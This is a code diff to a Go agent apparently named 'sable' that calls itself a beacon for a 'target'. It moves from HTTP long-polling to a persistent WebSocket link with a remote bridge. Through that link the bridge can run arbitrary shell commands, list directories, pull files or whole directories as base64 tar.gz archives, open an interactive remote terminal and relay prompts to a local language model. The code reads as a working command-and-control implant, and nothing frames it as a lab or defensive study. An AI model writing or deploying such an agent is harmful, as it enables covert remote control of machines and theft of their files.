@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"context"
+	"crypto/sha256"
 	"encoding/base64"
 	"encoding/json"
 	"flag"
@@ -16,6 +17,8 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/gorilla/websocket"
 )
 
 var (
@@ -26,7 +29,12 @@ var (
 	targetID    string
 	client      = &http.Client{Timeout: 35 * time.Second}
 	ptySessions sync.Map // sessionID -> *PTYSession
-	llmChats    sync.Map // chat_id -> last used time (for reset tracking)
+	llmChats    sync.Map // chat_id -> last used time
+
+	// Persistent WebSocket state
+	wsConn   *websocket.Conn
+	wsMu     sync.Mutex
+	wsDone   chan struct{}
 )
 
 func main() {
@@ -48,14 +56,17 @@ func main() {
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	// Start local diagnostics HTTP server (monitor + replay APIs)
+	// Start local diagnostics HTTP server
 	go startLocalServer()
 
-	// Heartbeat loop
+	// Heartbeat loop (30s idle)
 	go heartbeatLoop(ctx, hostname)
 
-	// Long-poll command loop (tight, no sleep)
-	commandLoop(ctx)
+	// Persistent WebSocket connection to bridge (replaces long-poll)
+	wsDone = make(chan struct{})
+	go wsLoop(ctx)
+
+	<-ctx.Done()
 }
 
 func loadOrCreateID() string {
@@ -65,7 +76,8 @@ func loadOrCreateID() string {
 	if err == nil && len(bytes.TrimSpace(data)) > 0 {
 		return strings.TrimSpace(string(data))
 	}
-	id := fmt.Sprintf("%s-%d", mustHostname(), time.Now().UnixNano())
+	hostHash := sha256.Sum256([]byte(mustHostname()))
+	id := fmt.Sprintf("sable-%x-%d", hostHash[:4], time.Now().UnixNano())
 	os.WriteFile(idPath, []byte(id), 0o644)
 	return id
 }
@@ -78,11 +90,12 @@ func mustHostname() string {
 	return h
 }
 
-// ── Heartbeat ────────────────────────────────────────────────
+// ── Heartbeat (30s idle) ─────────────────────────────────────
 
 func heartbeatLoop(ctx context.Context, hostname string) {
 	for {
-		sendHeartbeat(hostname)
+		sendHeartbeatWS(hostname)
+		pruneLLMChats()
 		select {
 		case <-ctx.Done():
 			return
@@ -91,142 +104,277 @@ func heartbeatLoop(ctx context.Context, hostname string) {
 	}
 }
 
-func sendHeartbeat(hostname string) {
-	payload := map[string]any{
+func pruneLLMChats() {
+	cutoff := time.Now().Add(-2 * time.Hour).Unix()
+	llmChats.Range(func(key, value any) bool {
+		if ts, ok := value.(int64); ok && ts < cutoff {
+			llmChats.Delete(key)
+		}
+		return true
+	})
+}
+
+// ── Persistent WebSocket Connection ──────────────────────────
+
+func wsLoop(ctx context.Context) {
+	defer close(wsDone)
+
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+		}
+
+		connectAndListen(ctx)
+
+		// Reconnect after brief delay
+		select {
+		case <-ctx.Done():
+			return
+		case <-time.After(2 * time.Second):
+		}
+	}
+}
+
+func connectAndListen(ctx context.Context) {
+	// Convert http(s) URL to ws(s)
+	wsURL := bridgeURL
+	if strings.HasPrefix(wsURL, "http://") {
+		wsURL = "ws://" + strings.TrimPrefix(wsURL, "http://")
+	} else if strings.HasPrefix(wsURL, "https://") {
+		wsURL = "wss://" + strings.TrimPrefix(wsURL, "https://")
+	}
+	wsURL = strings.TrimRight(wsURL, "/") + "/ws/beacon/" + targetID
+
+	log.Printf("[ws] connecting to %s", wsURL)
+
+	dialer := websocket.DefaultDialer
+	conn, _, err := dialer.DialContext(ctx, wsURL, nil)
+	if err != nil {
+		log.Printf("[ws] dial error: %v", err)
+		return
+	}
+
+	wsMu.Lock()
+	wsConn = conn
+	wsMu.Unlock()
+
+	defer func() {
+		wsMu.Lock()
+		wsConn = nil
+		wsMu.Unlock()
+		conn.Close()
+		log.Printf("[ws] disconnected")
+	}()
+
+	log.Printf("[ws] connected")
+
+	// Read loop — receives commands instantly from bridge
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+		}
+
+		_, raw, err := conn.ReadMessage()
+		if err != nil {
+			if !websocket.IsCloseError(err, websocket.CloseNormalClosure, websocket.CloseGoingAway) {
+				log.Printf("[ws] read error: %v", err)
+			}
+			return
+		}
+
+		var msg struct {
+			Type string          `json:"type"`
+			Data json.RawMessage `json:"data"`
+		}
+		if err := json.Unmarshal(raw, &msg); err != nil {
+			continue
+		}
+
+		switch msg.Type {
+		case "command":
+			var cmd Command
+			if err := json.Unmarshal(msg.Data, &cmd); err == nil {
+				go executeAndReportWS(ctx, cmd)
+			}
+		case "pty_input":
+			handlePTYInput(msg.Data)
+		case "pty_resize":
+			handlePTYResize(msg.Data)
+		}
+	}
+}
+
+// wsSend sends a message through the persistent WebSocket
+func wsSend(msgType string, data any) {
+	payload, err := json.Marshal(map[string]any{
+		"type": msgType,
+		"data": data,
+	})
+	if err != nil {
+		return
+	}
+
+	wsMu.Lock()
+	conn := wsConn
+	wsMu.Unlock()
+
+	if conn == nil {
+		return
+	}
+
+	if err := conn.WriteMessage(websocket.TextMessage, payload); err != nil {
+		log.Printf("[ws] send error: %v", err)
+	}
+}
+
+// sendHeartbeatWS sends heartbeat via persistent WS instead of HTTP POST
+func sendHeartbeatWS(hostname string) {
+	wsSend("heartbeat", map[string]any{
 		"target_id":   targetID,
 		"hostname":    hostname,
 		"platform":    runtime.GOOS + "/" + runtime.GOARCH,
 		"engine_type": "sable",
-	}
-	body, _ := json.Marshal(payload)
-	resp, err := client.Post(bridgeURL+"/api/beacon", "application/json", bytes.NewReader(body))
-	if err != nil {
-		log.Printf("[heartbeat] error: %v", err)
-		return
-	}
-	resp.Body.Close()
+	})
 }
 
-// ── Command Loop (long-poll) ─────────────────────────────────
+// ── Execute & Report (via WS, instant) ───────────────────────
 
-func commandLoop(ctx context.Context) {
-	for {
-		cmds, err := longPoll(ctx)
-		if err != nil {
-			log.Printf("[poll] error: %v", err)
-			select {
-			case <-ctx.Done():
-				return
-			case <-time.After(2 * time.Second):
-				continue
-			}
-		}
-		for _, cmd := range cmds {
-			go executeAndReport(ctx, cmd)
-		}
-	}
-}
-
-func longPoll(ctx context.Context) ([]Command, error) {
-	url := fmt.Sprintf("%s/api/commands/poll?target_id=%s&timeout=25", bridgeURL, targetID)
-	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
-	if err != nil {
-		return nil, err
-	}
-	resp, err := client.Do(req)
-	if err != nil {
-		return nil, err
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode == http.StatusNoContent || resp.StatusCode == http.StatusRequestTimeout {
-		return nil, nil
-	}
-
-	var result struct {
-		Commands []Command `json:"commands"`
-	}
-	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
-		return nil, err
-	}
-	return result.Commands, nil
-}
-
-type Command struct {
-	ID       string          `json:"id"`
-	TargetID string          `json:"target_id"`
-	Mode     string          `json:"mode"`
-	Payload  json.RawMessage `json:"payload"`
-}
-
-// ── Execute & Report ─────────────────────────────────────────
-
-func executeAndReport(ctx context.Context, cmd Command) {
-	log.Printf("[exec] cmd=%s mode=%s", cmd.ID, cmd.Mode)
+func executeAndReportWS(ctx context.Context, cmd Command) {
+	log.Printf("[exec] cmd=%s mode=%s prompt_len=%d", cmd.ID, cmd.Mode, len(cmd.Prompt))
 	result := executeCommand(ctx, cmd)
-	reportResult(cmd.ID, result)
-}
 
-func reportResult(commandID string, result map[string]any) {
-	payload := map[string]any{
-		"command_id": commandID,
+	// Report result back via persistent WS — no HTTP round-trip
+	wsSend("result", map[string]any{
+		"command_id": cmd.ID,
 		"target_id":  targetID,
 		"result":     result,
+	})
+}
+
+// ── PTY Input/Resize handlers ────────────────────────────────
+
+func handlePTYInput(data json.RawMessage) {
+	var p struct {
+		SessionID string `json:"session_id"`
+		Data      string `json:"data"`
 	}
-	body, _ := json.Marshal(payload)
-	resp, err := client.Post(bridgeURL+"/api/results", "application/json", bytes.NewReader(body))
-	if err != nil {
-		log.Printf("[report] error: %v", err)
+	if err := json.Unmarshal(data, &p); err != nil {
 		return
 	}
-	resp.Body.Close()
+	if val, ok := ptySessions.Load(p.SessionID); ok {
+		sess := val.(*PTYSession)
+		sess.Write([]byte(p.Data))
+	}
+}
+
+func handlePTYResize(data json.RawMessage) {
+	var p struct {
+		SessionID string `json:"session_id"`
+		Cols      int    `json:"cols"`
+		Rows      int    `json:"rows"`
+	}
+	if err := json.Unmarshal(data, &p); err != nil {
+		return
+	}
+	if val, ok := ptySessions.Load(p.SessionID); ok {
+		sess := val.(*PTYSession)
+		sess.Resize(p.Cols, p.Rows)
+	}
+}
+
+// ── Command Types & Execution ────────────────────────────────
+
+type Command struct {
+	ID       string `json:"id"`
+	TargetID string `json:"target_id"`
+	Mode     string `json:"mode"`
+	Prompt   string `json:"prompt"`
+}
+
+func (c *Command) parsedPayload() json.RawMessage {
+	if c.Prompt == "" {
+		return json.RawMessage(`{}`)
+	}
+	var obj map[string]any
+	if err := json.Unmarshal([]byte(c.Prompt), &obj); err == nil {
+		return json.RawMessage(c.Prompt)
+	}
+	switch c.Mode {
+	case "shell":
+		return json.RawMessage(fmt.Sprintf(`{"cmd":%s}`, jsonString(c.Prompt)))
+	default:
+		return json.RawMessage(fmt.Sprintf(`{"prompt":%s}`, jsonString(c.Prompt)))
+	}
+}
+
+func jsonString(s string) string {
+	b, _ := json.Marshal(s)
+	return string(b)
+}
+
+func cutLine(buf *strings.Builder) (string, bool) {
+	s := buf.String()
+	idx := strings.IndexByte(s, '\n')
+	if idx < 0 {
+		return "", false
+	}
+	line := s[:idx]
+	buf.Reset()
+	buf.WriteString(s[idx+1:])
+	return line, true
 }
 
 func executeCommand(ctx context.Context, cmd Command) map[string]any {
+	payload := cmd.parsedPayload()
 	switch cmd.Mode {
 	case "shell":
-		return execShell(cmd.Payload)
+		return execShell(payload)
 	case "fs_list":
-		return execFSList(cmd.Payload)
+		return execFSList(payload)
 	case "fs_download":
-		return execFSDownload(cmd.Payload)
+		return execFSDownload(payload)
 	case "llm":
-		return execLLM(ctx, cmd.Payload)
-	case "llm_reset":
-		return execLLMReset(cmd.Payload)
+		return execLLM(payload)
 	case "pty_connect":
-		return execPTYConnect(cmd.Payload)
+		return execPTYConnect(payload)
 	case "pty_disconnect":
-		return execPTYDisconnect(cmd.Payload)
+		return execPTYDisconnect(payload)
+	case "llm_reset":
+		return execLLMReset(payload)
 	default:
 		return map[string]any{"error": fmt.Sprintf("unknown mode: %s", cmd.Mode)}
 	}
 }
 
-// ── Shell ────────────────────────────────────────────────────
+// ── Shell Execution ──────────────────────────────────────────
 
 func execShell(payload json.RawMessage) map[string]any {
 	var p struct {
-		Prompt string `json:"prompt"`
+		Cmd string `json:"cmd"`
 	}
-	if err := json.Unmarshal(payload, &p); err != nil {
-		return map[string]any{"error": err.Error()}
+	if err := json.Unmarshal(payload, &p); err != nil || p.Cmd == "" {
+		return map[string]any{"error": "invalid shell command"}
 	}
 
 	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
 	defer cancel()
 
-	var c *exec.Cmd
-	if runtime.GOOS == "windows" {
-		c = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", p.Prompt)
-	} else {
-		c = exec.CommandContext(ctx, "sh", "-lc", p.Prompt)
+	shell := os.Getenv("SHELL")
+	if shell == "" {
+		shell = "/bin/sh"
 	}
 
-	out, err := c.CombinedOutput()
+	cmd := exec.CommandContext(ctx, shell, "-c", p.Cmd)
+	output, err := cmd.CombinedOutput()
+
 	result := map[string]any{
-		"output":   string(out),
 		"exit_code": 0,
+		"output":    string(output),
+		"mode":      "shell",
 	}
 	if err != nil {
 		if exitErr, ok := err.(*exec.ExitError); ok {
@@ -238,104 +386,134 @@ func execShell(payload json.RawMessage) map[string]any {
 	return result
 }
 
-// ── Filesystem List ──────────────────────────────────────────
+// ── Filesystem Helpers ───────────────────────────────────────
 
-func execFSList(payload json.RawMessage) map[string]any {
-	var p struct {
-		Path string `json:"path"`
+func expandPath(p string) string {
+	if strings.HasPrefix(p, "~/") || p == "~" {
+		home, err := os.UserHomeDir()
+		if err == nil {
+			return filepath.Join(home, strings.TrimPrefix(p, "~"))
+		}
 	}
-	if err := json.Unmarshal(payload, &p); err != nil {
-		return map[string]any{"error": err.Error()}
+	if !filepath.IsAbs(p) {
+		abs, err := filepath.Abs(p)
+		if err == nil {
+			return abs
+		}
 	}
-	if p.Path == "" {
-		p.Path = "."
-	}
+	return p
+}
 
-	entries, err := os.ReadDir(p.Path)
+type fsEntry struct {
+	Name        string `json:"name"`
+	IsDir       bool   `json:"is_dir"`
+	Size        int64  `json:"size"`
+	Modified    string `json:"modified"`
+	Permissions string `json:"permissions"`
+}
+
+func listDir(dir string) ([]fsEntry, error) {
+	entries, err := os.ReadDir(dir)
 	if err != nil {
-		return map[string]any{"error": err.Error()}
+		return nil, err
 	}
-
-	items := make([]map[string]any, 0, len(entries))
+	var result []fsEntry
 	for _, e := range entries {
 		info, err := e.Info()
 		if err != nil {
 			continue
 		}
-		items = append(items, map[string]any{
-			"name":        e.Name(),
-			"is_dir":      e.IsDir(),
-			"size":        info.Size(),
-			"modified":    info.ModTime().UTC().Format(time.RFC3339),
-			"permissions": info.Mode().String(),
+		result = append(result, fsEntry{
+			Name:        e.Name(),
+			IsDir:       e.IsDir(),
+			Size:        info.Size(),
+			Modified:    info.ModTime().Format(time.RFC3339),
+			Permissions: info.Mode().String(),
 		})
 	}
-
-	absPath, _ := filepath.Abs(p.Path)
-	return map[string]any{
-		"entries": items,
-		"path":    absPath,
-		"count":   len(items),
-	}
+	return result, nil
 }
 
-// ── Filesystem Download ──────────────────────────────────────
+func encodeBase64(data []byte) string {
+	out := make([]byte, base64.StdEncoding.EncodedLen(len(data)))
+	base64.StdEncoding.Encode(out, data)
+	return string(out)
+}
+
+// ── Filesystem Commands ──────────────────────────────────────
+
+func execFSList(payload json.RawMessage) map[string]any {
+	var p struct {
+		Path string `json:"path"`
+	}
+	if err := json.Unmarshal(payload, &p); err != nil || p.Path == "" {
+		p.Path = "."
+	}
+
+	expanded := expandPath(p.Path)
+	entries, err := listDir(expanded)
+	if err != nil {
+		return map[string]any{"error": err.Error(), "path": expanded}
+	}
+	return map[string]any{
+		"entries": entries,
+		"path":    expanded,
+		"count":   len(entries),
+	}
+}
 
 func execFSDownload(payload json.RawMessage) map[string]any {
 	var p struct {
 		Path string `json:"path"`
 	}
-	if err := json.Unmarshal(payload, &p); err != nil {
-		return map[string]any{"error": err.Error()}
+	if err := json.Unmarshal(payload, &p); err != nil || p.Path == "" {
+		return map[string]any{"error": "missing path"}
 	}
 
-	info, err := os.Stat(p.Path)
+	expanded := expandPath(p.Path)
+	info, err := os.Stat(expanded)
 	if err != nil {
 		return map[string]any{"error": err.Error()}
 	}
 
-	if !info.IsDir() {
-		data, err := os.ReadFile(p.Path)
-		if err != nil {
+	if info.IsDir() {
+		var buf bytes.Buffer
+		if err := tarGzDir(expanded, &buf); err != nil {
 			return map[string]any{"error": err.Error()}
 		}
 		return map[string]any{
-			"filename": filepath.Base(p.Path),
-			"data":     base64.StdEncoding.EncodeToString(data),
-			"size":     len(data),
-			"is_dir":   false,
+			"content":  encodeBase64(buf.Bytes()),
+			"filename": filepath.Base(expanded) + ".tar.gz",
+			"size":     buf.Len(),
 		}
 	}
 
-	// Directory: tar.gz and base64 encode
-	var buf bytes.Buffer
-	if err := tarGzDir(p.Path, &buf); err != nil {
-		return map[string]any{"error": fmt.Sprintf("tar.gz failed: %v", err)}
-	}
-	return map[string]any{
-		"filename": filepath.Base(p.Path) + ".tar.gz",
-		"data":     base64.StdEncoding.EncodeToString(buf.Bytes()),
-		"size":     buf.Len(),
-		"is_dir":   true,
-	}
-}
-
-// ── LLM Relay ────────────────────────────────────────────────
-
-func execLLM(ctx context.Context, payload json.RawMessage) map[string]any {
-	var p struct {
-		Prompt  string `json:"prompt"`
-		ChatID  string `json:"chat_id"`
-		Model   string `json:"model"`
-	}
-	if err := json.Unmarshal(payload, &p); err != nil {
+	data, err := os.ReadFile(expanded)
+	if err != nil {
 		return map[string]any{"error": err.Error()}
 	}
 
-	localURL := fmt.Sprintf("http://127.0.0.1:%d", sablePort)
+	return map[string]any{
+		"content":  encodeBase64(data),
+		"filename": filepath.Base(expanded),
+		"size":     len(data),
+	}
+}
 
-	// Create or use existing chat
+// ── LLM ──────────────────────────────────────────────────────
+
+func execLLM(payload json.RawMessage) map[string]any {
+	var p struct {
+		Prompt string `json:"prompt"`
+		ChatID string `json:"chat_id"`
+	}
+	if err := json.Unmarshal(payload, &p); err != nil || p.Prompt == "" {
+		return map[string]any{"error": "invalid llm request"}
+	}
+
+	localURL := fmt.Sprintf("http://127.0.0.1:%d", sablePort)
 	chatID := p.ChatID
+
 	if chatID == "" {
 		newChat := map[string]any{"title": "Beacon relay"}
 		body, _ := json.Marshal(newChat)
@@ -351,7 +529,6 @@ func execLLM(ctx context.Context, payload json.RawMessage) map[string]any {
 		chatID = cr.ID
 	}
 
-	// Send prompt
 	msg := map[string]any{
 		"chat_id": chatID,
 		"role":    "user",
@@ -364,25 +541,36 @@ func execLLM(ctx context.Context, payload json.RawMessage) map[string]any {
 	}
 	defer resp.Body.Close()
 
-	// Read SSE stream
 	var assistantReply strings.Builder
+	var lineBuf strings.Builder
 	buf := make([]byte, 4096)
 	for {
 		n, err := resp.Body.Read(buf)
 		if n > 0 {
-			chunk := string(buf[:n])
-			for _, line := range strings.Split(chunk, "\n") {
+			lineBuf.Write(buf[:n])
+			for {
+				line, found := cutLine(&lineBuf)
+				if !found {
+					break
+				}
 				line = strings.TrimSpace(line)
-				if strings.HasPrefix(line, "data: ") {
-					data := strings.TrimPrefix(line, "data: ")
-					if data == "[DONE]" {
-						break
-					}
-					var evt struct {
-						Content string `json:"content"`
-					}
-					if json.Unmarshal([]byte(data), &evt) == nil && evt.Content != "" {
+				if !strings.HasPrefix(line, "data: ") {
+					continue
+				}
+				data := strings.TrimPrefix(line, "data: ")
+				if data == "[DONE]" {
+					goto done
+				}
+				var evt struct {
+					Content string `json:"content"`
+					Type    string `json:"type"`
+					Text    string `json:"text"`
+				}
+				if json.Unmarshal([]byte(data), &evt) == nil {
+					if evt.Content != "" {
 						assistantReply.WriteString(evt.Content)
+					} else if evt.Type == "answer" && evt.Text != "" {
+						assistantReply.WriteString(evt.Text)
 					}
 				}
 			}
@@ -391,20 +579,20 @@ func execLLM(ctx context.Context, payload json.RawMessage) map[string]any {
 			break
 		}
 	}
+done:
 
 	return map[string]any{
-		"reply":    assistantReply.String(),
-		"chat_id":  chatID,
-		"mode":     "llm",
+		"reply":   assistantReply.String(),
+		"chat_id": chatID,
+		"mode":    "llm",
 	}
 }
 
-// ── PTY Connect ──────────────────────────────────────────────
+// ── PTY Connect / Disconnect ─────────────────────────────────
 
 func execPTYConnect(payload json.RawMessage) map[string]any {
 	var p struct {
 		SessionID string `json:"session_id"`
-		BridgeWS  string `json:"bridge_ws_url"`
 		Cols      int    `json:"cols"`
 		Rows      int    `json:"rows"`
 	}
@@ -419,7 +607,8 @@ func execPTYConnect(payload json.RawMessage) map[string]any {
 		p.Rows = 40
 	}
 
-	sess, err := StartPTY(p.SessionID, p.BridgeWS, p.Cols, p.Rows)
+	// Start PTY locally — input/output now routed through the main WS
+	sess, err := StartPTYLocal(p.SessionID, p.Cols, p.Rows)
 	if err != nil {
 		return map[string]any{"error": fmt.Sprintf("pty start: %v", err)}
 	}
@@ -432,8 +621,6 @@ func execPTYConnect(payload json.RawMessage) map[string]any {
 		"session_id": p.SessionID,
 	}
 }
-
-// ── PTY Disconnect ───────────────────────────────────────────
 
 func execPTYDisconnect(payload json.RawMessage) map[string]any {
 	var p struct {
@@ -452,8 +639,6 @@ func execPTYDisconnect(payload json.RawMessage) map[string]any {
 	return map[string]any{"status": "disconnected"}
 }
 
-// ── LLM Reset ────────────────────────────────────────────────
-
 func execLLMReset(payload json.RawMessage) map[string]any {
 	var p struct {
 		ChatID string `json:"chat_id"`
@@ -464,7 +649,6 @@ func execLLMReset(payload json.RawMessage) map[string]any {
 
 	localURL := fmt.Sprintf("http://127.0.0.1:%d", sablePort)
 
-	// Delete the chat to reset conversation state
 	if p.ChatID != "" {
 		req, _ := http.NewRequest("DELETE", localURL+"/api/chat/"+p.ChatID, nil)
 		resp, err := client.Do(req)
@@ -476,7 +660,6 @@ func execLLMReset(payload json.RawMessage) map[string]any {
 		return map[string]any{"status": "reset", "chat_id": p.ChatID}
 	}
 
-	// No chat_id: clear all tracked chats
 	llmChats.Range(func(key, value any) bool {
 		llmChats.Delete(key)
 		return true
@@ -489,7 +672,6 @@ func execLLMReset(payload json.RawMessage) map[string]any {
 func startLocalServer() {
 	mux := http.NewServeMux()
 
-	// Monitor endpoints
 	mux.HandleFunc("POST /diag/monitor/register", handleMonitorRegister)
 	mux.HandleFunc("POST /diag/monitor/heartbeat", handleMonitorHeartbeat)
 	mux.HandleFunc("POST /diag/monitor/inactive", handleMonitorMarkInactive)
@@ -500,7 +682,6 @@ func startLocalServer() {
 	mux.HandleFunc("POST /diag/monitor/probe", handleMonitorProbe)
 	mux.HandleFunc("POST /diag/monitor/clear", handleMonitorClear)
 
-	// Replay endpoints
 	mux.HandleFunc("POST /diag/replay/start", handleReplayStart)
 	mux.HandleFunc("GET /diag/replay/{replay_id}", handleReplayResult)
 	mux.HandleFunc("POST /diag/replay/stop", handleReplayStop)
